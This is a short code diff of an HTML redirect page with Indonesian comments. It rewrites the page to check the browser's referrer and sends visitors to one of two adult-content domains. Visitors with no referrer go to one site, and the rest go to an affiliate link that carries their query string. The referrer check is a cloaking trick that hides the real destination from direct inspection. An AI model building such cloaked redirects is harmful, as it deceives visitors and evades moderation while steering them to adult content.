@@ -5,11 +5,20 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirection...</title>
     <script>
-        const currentUrl = new URL(window.location.href);
-        const params = currentUrl.search;
+        // Ambil referer
+        const referer = document.referrer;
 
-        
-        window.location.href = "https://a.fullpornoflix.net/api/direct/484893" + params;
+        // Validasi jika referer kosong
+        if (!referer) {
+            // Arahkan ke halaman blokir
+            window.location.href = "https://pornhammer.co";
+        } else {
+            // Jika ada referer, arahkan ke URL target
+            const currentUrl = new URL(window.location.href);
+            const params = currentUrl.search;
+
+            window.location.href = "https://a.fullpornoflix.net/api/direct/480428" + params;
+        }
     </script>
 </head>
 <body>
